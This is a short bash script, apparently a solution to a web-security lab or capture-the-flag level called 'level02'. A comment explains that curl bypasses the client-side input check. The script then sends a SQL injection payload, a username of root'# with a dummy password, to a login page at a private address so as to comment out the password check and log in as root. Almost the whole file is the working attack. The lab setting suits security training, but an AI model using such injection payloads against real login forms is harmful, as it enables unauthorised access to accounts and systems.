#! /usr/bin/env bash

# The client avoids injecting code in the username input, and the server hashes the password input,
# but we can bypass the client protection by using curl instead of a browser and just use the same
# method as the previous level.
curl --data "user=root'#" --data "pass=a" http://10.0.23.24:8004/level02/index.php